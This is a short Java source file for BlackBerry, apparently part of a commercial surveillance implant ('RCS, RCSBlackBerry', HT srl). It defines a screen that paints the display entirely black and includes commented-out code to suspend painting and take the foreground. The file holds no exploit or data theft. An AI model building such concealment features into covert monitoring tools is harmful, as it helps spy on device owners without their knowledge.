//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
package blackberry;

import net.rim.device.api.ui.Color;
import net.rim.device.api.ui.Graphics;
import net.rim.device.api.ui.container.MainScreen;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class BlackScreen extends MainScreen {
    //#ifdef DEBUG
    private static Debug debug = new Debug("BlackScreen", DebugLevel.VERBOSE);

    //#endif

    public BlackScreen() {
        setTitle("Black");
    }

    protected void onObscured() {
        //#ifdef DEBUG
        debug.info("Obscured");
        //#endif

        /*
         * Screen activeScreen =
         * UiApplication.getUiApplication().getActiveScreen();
         * activeScreen.getUiEngine().suspendPainting(true);
         * UiApplication.getApplication().requestForeground();
         */
    }

    protected void onExposed() {
        //#ifdef DEBUG
        debug.info("Exposed");
        //#endif

        /*
         * UiApplication.getUiApplication().popScreen(this); Screen activeScreen
         * = UiApplication.getUiApplication().getActiveScreen(); if
         * (activeScreen.getUiEngine().isPaintingSuspended()) {
         * activeScreen.getUiEngine().suspendPainting(false); }
         * activeScreen.doPaint();
         */
    }

    public void paint(Graphics graphics) {
        // Sets the BackgroundColor
        graphics.setBackgroundColor(Color.BLACK);
        //#ifdef DEBUG
        graphics.setColor(Color.WHITESMOKE);
        graphics.drawText("Black", 0, 10);
        //#endif
        // Clears the entire graphic area to the current background
        graphics.clear();
    }
}